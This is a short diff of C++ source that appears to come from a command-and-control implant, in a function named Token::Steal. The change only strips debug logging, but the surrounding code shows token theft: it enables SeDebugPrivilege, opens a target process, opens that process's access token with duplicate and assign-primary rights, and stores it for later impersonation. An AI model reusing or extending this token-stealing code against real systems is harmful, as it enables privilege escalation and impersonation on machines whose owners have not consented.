@@ -156,29 +156,17 @@ auto DECLFN Token::Steal(
     LONG  TokenFlags = TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_DUPLICATE;
     ULONG TokenID    = Rnd32() % 9999;
 
-    KhDbg("ID: %d", TokenID);
-
-    KhDbg( "%d", KhGetError );
     TokenHandle = this->Current();
 
-    KhDbg( "%d", KhGetError );
     this->SetPriv( TokenHandle, "SeDebugPrivilege" );
 
-    KhDbg( "%d", KhGetError );
     Self->Ntdll.NtClose( TokenHandle );
-    KhDbg( "%d", KhGetError );
-
-    KhDbg( "proc %d", ProcessID );
 
     ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
     if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) return nullptr;
 
-    KhDbg( "Process Opened" );
-
     Self->Tkn->ProcOpen( ProcessHandle, TokenFlags, &TokenHandle );
     if ( TokenHandle == INVALID_HANDLE_VALUE || !TokenHandle ) return nullptr;
-
-    KhDbg( "Token Opened" );
 
     TOKEN_NODE* NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof( TOKEN_NODE ) );
 
